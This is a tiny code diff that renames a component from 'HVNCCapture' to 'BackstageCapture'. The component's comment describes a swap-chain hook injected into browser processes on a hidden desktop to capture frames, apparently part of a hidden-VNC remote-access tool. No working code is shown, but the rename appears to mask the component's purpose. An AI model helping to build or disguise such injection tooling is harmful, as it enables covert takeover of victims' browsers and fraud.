@@ -1,5 +1,5 @@
 //===============================================================================================//
-// HVNCCapture — DXGI SwapChain::Present hook for fast HVNC frame capture.
+// BackstageCapture — DXGI SwapChain::Present hook for fast HVNC frame capture.
 //
 // Injected into browser processes running on the hidden desktop. Hooks
 // IDXGISwapChain::Present to intercept rendered frames, copies the backbuffer
